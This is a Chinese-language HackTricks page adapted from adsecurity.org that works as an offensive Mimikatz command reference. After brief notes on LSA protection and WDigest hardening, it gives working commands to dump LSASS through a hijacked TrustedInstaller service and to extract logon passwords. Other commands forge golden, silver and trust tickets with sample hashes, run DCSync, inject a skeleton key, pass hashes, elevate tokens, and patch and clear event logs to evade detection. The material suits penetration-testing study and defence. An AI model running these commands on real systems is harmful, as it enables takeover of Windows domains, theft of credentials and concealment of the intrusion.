# Mimikatz

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在一家**网络安全公司**工作吗？想要在HackTricks中看到你的**公司广告**吗？或者你想要**获取PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[NFT收藏品**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram群组**](https://t.me/peass) 或 **关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**

</details>

本页内容来自[adsecurity.org](https://adsecurity.org/?page\_id=1821)

## 内存中的LM和明文密码

从Windows 8.1和Windows Server 2012 R2开始，LM哈希和“明文”密码不再保存在内存中。

为了防止“明文”密码被放置在LSASS中，需要将以下注册表键设置为“0”（禁用Digest）：

_HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest “UseLogonCredential”(DWORD)_

## **Mimikatz和LSA保护：**

Windows Server 2012 R2和Windows 8.1包含一个名为LSA保护的新功能，它涉及在Windows Server 2012 R2上启用[LSASS作为受保护进程](https://technet.microsoft.com/en-us/library/dn408187.aspx)（Mimikatz可以通过驱动程序绕过，但这会在事件日志中产生一些噪音）：

_LSA包括本地安全性管理器服务器服务（LSASS）进程，用于验证本地和远程登录并执行本地安全策略。Windows 8.1操作系统为LSA提供了额外的保护，以防止非受保护进程读取内存和注入代码。这为LSA存储和管理的凭据提供了额外的安全性。_

启用LSA保护：

1. 打开注册表编辑器（RegEdit.exe），导航到位于以下位置的注册表键：HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa，并将注册表键的值设置为：“RunAsPPL”=dword:00000001。
2. 创建一个新的GPO，浏览到计算机配置，首选项，Windows设置。右键单击注册表，指向新建，然后单击注册表项。出现新的注册表属性对话框。在Hive列表中，单击HKEY\_LOCAL\_MACHINE。在Key Path列表中，浏览到SYSTEM\CurrentControlSet\Control\Lsa。在Value name框中，键入RunAsPPL。在Value type框中，单击REG\_DWORD。在Value data框中，键入00000001。单击确定。

LSA保护防止非受保护进程与LSASS进行交互。Mimikatz仍然可以通过驱动程序（“!+”）绕过此保护。

[![Mimikatz-Driver-Remove-LSASS-Protection](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Driver-Remove-LSASS-Protection.jpg)](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Driver-Remove-LSASS-Protection.jpg)

### 绕过已禁用的SeDebugPrivilege
默认情况下，SeDebugPrivilege通过本地安全策略授予管理员组。在Active Directory环境中，[可以通过设置计算机配置 --> 策略 --> Windows设置 --> 安全设置 --> 本地策略 --> 用户权限分配 --> 调试程序定义为空组](https://medium.com/blue-team/preventing-mimikatz-attacks-ed283e7ebdd5)来删除此特权。即使在离线的AD连接设备上，也无法覆盖此设置，当本地管理员尝试转储内存或使用Mimikatz时，将收到错误提示。

然而，TrustedInstaller帐户仍然可以访问转储内存，并且[可以用于绕过此防御](https://www.pepperclipp.com/other-articles/dump-lsass-when-debug-privilege-is-disabled)。通过修改TrustedInstaller服务的配置，可以运行该帐户来使用ProcDump并转储`lsass.exe`的内存。
```
sc config TrustedInstaller binPath= "C:\Users\Public\procdump64.exe -accepteula -ma lsass.exe C:\Users\Public\lsass.dmp"
sc start TrustedInstaller
```
![TrustedInstaller-Dump-Lsass](https://1860093151-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-M6yZUYP7DLMbZuztKpV%2Fuploads%2FJtprjloNPADNSpb6S0DS%2Fimage.png?alt=media&token=9b639459-bd4c-4897-90af-8990125fa058)

这个转储文件可以被传输到一个受攻击者控制的计算机上，从中提取凭据。
```
# privilege::debug
# sekurlsa::minidump lsass.dmp
# sekurlsa::logonpasswords
```
## 主要

### **事件**

**EVENT::Clear** – 清除事件日志\
[\
![Mimikatz-Event-Clear](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Event-Clear.png)](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Event-Clear.png)

**EVENT:::Drop** – (_**实验性**_) 修补事件服务以避免新事件

[![Mimikatz-Event-Drop](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Event-Drop.png)](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Event-Drop.png)

注意:\
运行 privilege::debug 然后运行 event::drop 来修补事件日志。然后运行 Event::Clear 来清除事件日志，而不会记录任何已清除的事件日志 (1102)。

### KERBEROS

#### 黄金票据

黄金票据是使用 KRBTGT NTLM 密码哈希进行加密和签名的 TGT。

可以创建黄金票据来冒充域中的任何用户（真实或虚构），作为域中任何组的成员（提供几乎无限的权限）访问域中的任何资源。

**Mimikatz 黄金票据命令参考:**

创建黄金票据的 Mimikatz 命令是 "kerberos::golden"

* /domain – 完全限定域名。例如: "lab.adsecurity.org"。
* /sid – 域的 SID。例如: "S-1-5-21-1473643419-774954089-2222329127"。
* /sids – 附加的 AD 森林中具有所需权限的帐户/组的 SID。通常，这将是根域的 Enterprise Admins 组 "S-1-5-21-1473643419-774954089-5872329127-519"。[此参数将提供的 SID 添加到 SID History 参数中。](https://adsecurity.org/?p=1640)
* /user – 要冒充的用户名
* /groups (可选) – 用户所属的组 RID（第一个是主要组）。\
添加用户或计算机帐户的 RID 以获得相同的访问权限。\
默认组: 513,512,520,518,519 用于众所周知的管理员组（如下所列）。
* /krbtgt – 域 KDC 服务帐户（KRBTGT）的 NTLM 密码哈希。用于加密和签名 TGT。
* /ticket (可选) – 提供保存黄金票据文件的路径和名称，以供以后使用，或使用 /ptt 立即将黄金票据注入内存供使用。
* /ptt – 作为 /ticket 的替代方案 – 使用此选项立即将伪造的票据注入内存供使用。
* /id (可选) – 用户 RID。Mimikatz 默认值为 500（默认管理员帐户 RID）。
* /startoffset (可选) – 票据可用的开始偏移量（如果使用此选项，通常设置为 -10 或 0）。Mimikatz 默认值为 0。
* /endin (可选) – 票据的生存期。Mimikatz 默认值为 10 年（约 5,262,480 分钟）。Active Directory 默认的 Kerberos 策略设置为 10 小时（600 分钟）。
* /renewmax (可选) – 具有续订的最大票据生存期。Mimikatz 默认值为 10 年（约 5,262,480 分钟）。Active Directory 默认的 Kerberos 策略设置为 7 天（10,080 分钟）。
* /sids (可选) – 设置为 AD 森林中 Enterprise Admins 组的 SID（\[ADRootDomainSID]-519），以在整个 AD 森林中冒充 Enterprise Admin 权限（在 AD 森林中的每个域中的 AD 管理员）。
* /aes128 – AES128 密钥
* /aes256 – AES256 密钥

黄金票据默认组:

* 域用户 SID: S-1-5-21\<DOMAINID>-513
* 域管理员 SID: S-1-5-21\<DOMAINID>-512
* 架构管理员 SID: S-1-5-21\<DOMAINID>-518
* 企业管理员 SID: S-1-5-21\<DOMAINID>-519（仅在创建伪造票据时位于 Forest 根域中有效，但可以使用 /sids 参数添加以获取 AD 森林管理员权限）
* 策略创建者所有者 SID: S-1-5-21\<DOMAINID>-520
```
.\mimikatz "kerberos::golden /User:Administrator /domain:rd.lab.adsecurity.org /id:512 /sid:S-1-5-21-135380161-102191138-581311202 /krbtgt:13026055d01f235d67634e109da03321 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt" exit
```
[跨域的黄金票据](https://adsecurity.org/?p=1640)

#### 银票据

银票据是使用目标服务账户（通过SPN映射识别）的NTLM密码哈希进行加密和签名的TGS（与TGT格式类似）。

**创建银票据的示例Mimikatz命令：**

以下Mimikatz命令为adsmswin2k8r2.lab.adsecurity.org服务器上的CIFS服务创建了一个银票据。为了成功创建这个银票据，需要先发现adsmswin2k8r2.lab.adsecurity.org的AD计算机账户密码哈希，可以通过AD域转储或在本地系统上运行Mimikatz（如上所示：_Mimikatz "privilege::debug" "sekurlsa::logonpasswords" exit_）来获取。NTLM密码哈希与/rc4参数一起使用。还需要在/service参数中识别服务SPN类型。最后，在/target参数中提供目标计算机的完全限定域名。不要忘记在/sid参数中提供域SID。
```
mimikatz “kerberos::golden /admin:LukeSkywalker /id:1106 /domain:lab.adsecurity.org /sid:S-1-5-21-1473643419-774954089-2222329127 /target:adsmswin2k8r2.lab.adsecurity.org /rc4:d7e2b80507ea074ad59f152a1ba20458 /service:cifs /ptt” exit
```
#### [**信任票据**](https://adsecurity.org/?p=1588)

一旦确定了Active Directory信任密码哈希值，就可以生成信任票据。信任票据是使用两个相互信任的域之间共享的密码创建的。
[有关信任票据的更多背景信息。](https://adsecurity.org/?p=1588)

**转储信任密码（信任密钥）**
```
Mimikatz “privilege::debug” “lsadump::trust /patch” exit
```
**使用Mimikatz创建伪造的信任票据（跨域TGT）**

使用Mimikatz伪造信任票据，该票据声明持有者是AD Forest中的企业管理员（利用Mimikatz中的SIDHistory，“sids”在信任之间传递，这是我对Mimikatz的“贡献”）。这将使得从子域到父域具有完全的管理访问权限。请注意，此帐户实际上不需要存在于任何地方，因为它是跨域的Golden Ticket。
```
Mimikatz “Kerberos::golden /domain:child.lab.adsecurity.org /sid:S-1-5-21-3677078698-724690114-1972670770 /sids:S-1-5-21-1581655573-3923512380-696647894-519 /rc4:49ed1653275f78846ff06de1a02386fd /user:DarthVader /service:krbtgt /target:lab.adsecurity.org /ticket:c:\temp\tickets\EA-ADSECLABCHILD.kirbi” exit
```
#### **更多KERBEROS**

**KERBEROS::List** - 列出用户内存中的所有用户票证（TGT和TGS）。不需要特殊权限，因为它只显示当前用户的票证。类似于“klist”的功能。

**KERBEROS::PTC** - 传递缓存（NT6）
类似于Mac OS、Linux、BSD、Unix等*Nix系统会缓存Kerberos凭据。这些缓存数据可以通过Mimikatz进行复制和传递。也可用于在ccache文件中注入Kerberos票证。

Mimikatz的kerberos::ptc的一个很好的例子是在[利用PyKEK的MS14-068漏洞](https://adsecurity.org/?p=676)时。PyKEK生成一个ccache文件，可以使用kerberos::ptc将其注入到Mimikatz中。

**KERBEROS::PTT** - 传递票证
在找到[Kerberos票证](https://adsecurity.org/?p=1667)后，可以将其复制到另一台系统并传递到当前会话中，有效地模拟登录而无需与域控制器进行任何通信。不需要特殊权限。
类似于SEKURLSA::PTH（Pass-The-Hash）。

* /filename - 票证的文件名（可以是多个）
* /directory - 目录路径，其中的所有.kirbi文件将被注入。

**KERBEROS::Purge** - 清除所有Kerberos票证
类似于“klist purge”的功能。在传递票证（PTC、PTT等）之前运行此命令，以确保使用正确的用户上下文。

**KERBEROS::TGT** - 获取当前用户的当前TGT。

### LSADUMP

**LSADUMP**::**DCShadow** - 将当前计算机设置为DC，以便能够在DC内创建新对象（持久性方法）。
这需要完整的AD管理员权限或KRBTGT密码哈希。
DCShadow临时将计算机设置为“DC”，用于复制的目的：

* 在AD林配置分区中创建2个对象。
* 更新所使用计算机的SPN，包括“GC”（全局目录）和“E3514235-4B06-11D1-AB04-00C04FC2DCD2”（AD复制）。有关Kerberos服务主体名称的更多信息，请参见[ADSecurity SPN部分](https://adsecurity.org/?page\_id=183)。
* 通过DrsReplicaAdd和KCC将更新推送到DC。
* 从配置分区中删除创建的对象。

**LSADUMP::DCSync** - 请求DC同步对象（获取帐户的密码数据）
[需要域管理员、域管理员或自定义委派的成员资格。](https://adsecurity.org/?p=1729)

Mimikatz在2015年8月添加的一个重要功能是“DCSync”，它有效地“冒充”域控制器，并从目标域控制器请求帐户密码数据。

**DCSync选项：**

* /all - DCSync获取整个域的数据。
* /user - 要获取数据的用户的用户ID或SID。
* /domain（可选） - Active Directory域的FQDN。Mimikatz将发现一个要连接的域中的DC。如果未提供此参数，Mimikatz将默认为当前域。
* /csv - 导出为csv
* /dc（可选） - 指定要DCSync连接并收集数据的域控制器。

还有一个/guid参数。

**DCSync命令示例：**

获取rd.adsecurity.org域中KRBTGT用户帐户的密码数据：
_Mimikatz "lsadump::dcsync /domain:rd.adsecurity.org /user:krbtgt" exit_

获取rd.adsecurity.org域中Administrator用户帐户的密码数据：
_Mimikatz "lsadump::dcsync /domain:rd.adsecurity.org /user:Administrator" exit_

获取lab.adsecurity.org域中ADSDC03域控制器计算机帐户的密码数据：
_Mimikatz "lsadump::dcsync /domain:lab.adsecurity.org /user:adsdc03$" exit_

**LSADUMP::LSA** - 请求LSA服务器检索SAM/AD企业（正常、即时修补或注入）数据。使用/patch获取部分数据，使用/inject获取全部数据。_需要系统或调试权限。_

* /inject - 注入LSASS以提取凭据
* /name - 目标用户帐户的帐户名
* /id - 目标用户帐户的RID
* /patch - 修补LSASS。

通常，服务帐户是域管理员（或等效）的成员，或者最近有一个域管理员登录到计算机上，攻击者可以从中转储凭据。使用这些凭据，攻击者可以访问域控制器并获取所有域凭据，包括用于创建Kerberos Golden Tickets的KRBTGT帐户NTLM哈希。
```
mimikatz lsadump::lsa /inject exit
```
**LSADUMP::NetSync**

NetSync提供了一种简单的方法，使用DC计算机帐户密码数据来冒充域控制器，通过Silver Ticket并DCSync目标帐户的信息，包括密码数据。

**LSADUMP::SAM** - 获取SysKey以解密SAM条目（来自注册表或hive）。SAM选项连接到本地安全帐户管理器（SAM）数据库，并转储本地帐户的凭据。

**LSADUMP::Secrets** - 获取SysKey以解密SECRETS条目（来自注册表或hive）。

**LSADUMP::SetNTLM** - 请求服务器为一个用户设置新的密码/ntlm。

[**LSADUMP::Trust**](https://adsecurity.org/?p=1588) - 请求LSA服务器检索信任认证信息（正常或即时修补）。

### MISC

[**MISC::Skeleton**](https://adsecurity.org/?p=1275) - 将骨架密钥注入到域控制器上的LSASS进程中。
```
"privilege::debug" "misc::skeleton"
```
### PRIVILEGE

**PRIVILEGE::Backup** – 获取备份特权/权限。需要调试权限。

**PRIVILEGE::Debug** – 获取调试权限（许多Mimikatz命令需要此权限或本地系统权限）。

### SEKURLSA

**SEKURLSA::Credman** – 列出凭据管理器

**SEKURLSA::Ekeys** – 列出Kerberos加密密钥

**SEKURLSA::Kerberos** – 列出所有已认证用户（包括服务和计算机账户）的Kerberos凭据

**SEKURLSA::Krbtgt** – 获取域Kerberos服务账户（KRBTGT）的密码数据

**SEKURLSA::SSP** – 列出SSP凭据

**SEKURLSA::Wdigest** – 列出WDigest凭据

**SEKURLSA::LogonPasswords** – 列出所有可用的提供者凭据。通常显示最近登录的用户和计算机凭据。

* 在LSASS中转储当前登录（或最近登录）账户的密码数据，以及在用户凭据上下文中运行的服务。
* 账户密码以可逆的方式存储在内存中。如果它们在内存中（在Windows 8.1/Windows Server 2012 R2之前是这样），它们将被显示出来。Windows 8.1/Windows Server 2012 R2在大多数情况下不以这种方式存储账户密码。KB2871997将此安全功能“回溯”到Windows 7、Windows 8、Windows Server 2008R2和Windows Server 2012，但应用KB2871997后，计算机需要进行额外的配置。
* 需要管理员访问权限（具有调试权限）或本地SYSTEM权限

**SEKURLSA::Minidump** – 切换到LSASS minidump进程上下文（读取lsass转储）

**SEKURLSA::Pth** – 传递哈希和超越传递哈希（也称为传递密钥）。

_Mimikatz可以执行众所周知的“传递哈希”操作，以使用用户密码的NTLM哈希而不是实际密码在另一个凭据下运行进程。为此，它使用一个虚假的身份启动一个进程，然后用真实信息（真实密码的NTLM哈希）替换虚假信息（虚假密码的NTLM哈希）。_

* /user – 您想要模拟的用户名，请记住，Administrator不是这个众所周知账户的唯一名称。
* /domain – 完全限定的域名 - 如果没有域或在本地用户/管理员的情况下，请使用计算机或服务器名称、工作组或其他名称。
* /rc4或/ntlm – 可选 - 用户密码的RC4密钥/NTLM哈希。
* /run – 可选 - 要运行的命令行 - 默认为：cmd以获得一个shell。

[![Mimikatz-Sekurlsa-PTH](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Sekurlsa-PTH.jpg)](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Sekurlsa-PTH.jpg)

**SEKURLSA::Tickets** – 列出所有最近认证用户的Kerberos票据，包括在用户账户上下文中运行的服务和本地计算机的AD计算机账户。\
与kerberos::list不同，sekurlsa使用内存读取，不受密钥导出限制。sekurlsa可以访问其他会话（用户）的票据。

* /export – 可选 – 票据以.kirbi文件导出。它们以用户的LUID和组号开头（0 = TGS，1 = 客户端票据(?)和2 = TGT）

与从LSASS转储凭据类似，使用sekurlsa模块，攻击者可以在系统内存中获取所有Kerberos票据数据，包括管理员或服务的票据。\
如果攻击者已经入侵了一个配置了Kerberos委派的Web服务器，并且用户使用后端SQL服务器访问该服务器，这将非常有用。这使得攻击者能够在该服务器上捕获和重用所有用户票据的内存。

“kerberos::tickets” mimikatz命令转储当前登录用户的Kerberos票据，不需要提升权限。利用sekurlsa模块读取受保护内存（LSASS）的能力，可以转储系统上的所有Kerberos票据。

命令：_mimikatz sekurlsa::tickets exit_

* 转储系统上所有已认证的Kerberos票据。
* 需要管理员访问权限（具有调试权限）或本地SYSTEM权限

### **SID**

Mimikatz SID模块替代了MISC::AddSID。使用SID::Patch来修补ntds服务。

**SID::add** – 将SID添加到对象的SIDHistory中

[![Mimikatz-SID-add](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-SID-add.png)](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-SID-add.png)

**SID::modify** – 修改对象的对象SID

[![Mimikatz-SID-Modify](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-SID-Modify.png)](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-SID-Modify.png)

### **TOKEN**

Mimikatz Token模块使Mimikatz能够与Windows身份验证令牌进行交互，包括获取和模拟现有令牌。

**TOKEN::Elevate** – 模拟一个令牌。用于提升权限到SYSTEM（默认）或使用Windows API在盒子上查找域管理员令牌。\
_需要管理员权限。_

[![Mimikatz-Token-Elevate1](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Token-Elevate1-1.png)](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Token-Elevate1-1.png)

在盒子上找到一个域管理员凭据并使用该令牌：_token::elevate /domainadmin_

[![Mimikatz-Token-Elevate-DomainAdmin](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Token-Elevate-DomainAdmin.jpg)](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Token-Elevate-DomainAdmin.jpg)

**TOKEN::List** – 列出系统上的所有令牌

### **TS**

**TS::MultiRDP** – （实验性）修补终端服务器服务以允许多个用户

[![Mimikatz-TS-MultiRDP](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-TS-MultiRDP.png)](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-TS-MultiRDP.png)

**TS::Sessions** – 列出TS/RDP会话。

![](https://adsecurity.org/wp-content/uploads/2017/11/Mimikatz-TS-Sessions.png)
### 保险库

`mimikatz.exe "privilege::debug" "token::elevate" "vault::cred /patch" "exit"` - 获取计划任务的密码

\
\
\\

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在一家**网络安全公司**工作吗？想要在HackTricks中**宣传你的公司**吗？或者想要**获取PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[NFT收藏品**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram群组**](https://t.me/peass)，或者**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**

</details>
